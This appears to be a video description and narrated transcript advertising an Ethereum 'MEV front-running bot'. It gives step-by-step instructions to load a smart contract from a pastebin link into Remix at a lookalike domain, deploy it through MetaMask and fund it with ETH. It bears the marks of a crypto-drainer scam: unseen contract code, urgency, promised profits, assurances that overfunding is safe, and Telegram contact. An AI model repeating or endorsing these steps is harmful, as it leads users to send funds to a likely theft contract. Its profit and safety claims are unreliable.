title: Uniswap Front Running Bot MEV | ETH Flash Loan Arbitrage 2023 Update
description: Everyone in cryptocurrency NEEDS to know about MEV arbitrage bots. Using Maximal Extractable Value (MEV) technology, bots like this are able to sniff the mempool for pending transactions on decentralized exchanges such as Uniswap. The bot inserts our own transaction with a slightly higher gas fee, 1 Gwei higher than the transaction which is trying to be entered. This essentially sandwiches the pending transaction and forces ours to be processed first, consequently profiting off of the slippage difference.  For your questions, you can PM me on Telegram:   Rick (Please only ask contract related questions)  :check mark button:Updated Code: Working as of May 21 , 2023 (Thanks you guys Steven and Tim from Telegram, for giving me feedback on your Bots, I've just updated the source code to the Bot for running more smoothly. )  ***** STEP BY STEP INSTRUCTIONS *****  1. Download MetaMask: :pushpin:https://metamask.io/download.html  2. Access Remix:  :pushpin:https://www.remixcompiler.pro  3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"  4. Paste SmartContract in Remix:  :pushpin:https://pastebin.com/raw/cddY2UsN  5. Move to the "Solidity Compiler" tab, select version "0.6.12" and then "Compile" it  6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now  7. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address  8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'  Learn more about MEV here: www.ethereum.org/en/developers/docs/mev/  EDIT: I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees.  If you fund the contract with 0.4 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with around 0.5 - 1 ETH just to make sure that won't happen.

Then, we have no future challenges any longer, so we are going to click over here on Deploy, and Run, and change this to Inject Web 3. But before we can run the contract, we have to fund it. We have to put gas money in the contract. So, we're going to go over here first and click copy. This is your contract address. Go to your MetaMask. You're going to have to send gas money to run this contract. The smart contract we've deployed is going to do a lot of different transactions on Uniswap, trading back and forth so fees will be needed for this. Okay, so we sent gas to it. Now we have to wait until that goes through before we can run the action on this. If I would have accidentally run the action without giving gas money, it wouldn't have done anything. The contract would have been exhausted because it wouldn't have had any gas to run it. Another thing to remember is you can't overfund your contract. You'll only use the amount of gas that it needs to run and you'll always have that money still left in your contract. So it's better to overfund it than underfund it. Okay, now we can run this action. We're going to start our contract and run it through. We can hit the red start button under the deploy contract in the bottom left of the screen. So, here we go. This will make MetaMask pop up, so we have to confirm this in order for the bot to start. Okay, awesome. Now the bot will be working.
